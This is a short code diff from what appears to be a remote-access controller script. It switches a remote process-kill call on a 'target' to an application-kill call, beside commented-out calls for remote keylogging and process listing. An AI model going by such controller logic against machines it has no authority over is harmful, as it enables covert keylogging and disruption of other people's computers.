@@ -83,4 +83,6 @@ t.start()
 # handler.list_process(target[1])
 # handler.keylog(target[1], 30)
 # handler.list_application(target[1])
-handler.kill_process(target[1], 16316)
+# handler.kill_process(target[1], 16316) # ------------
+handler.kill_application(target[1], 3504) # ----------
+
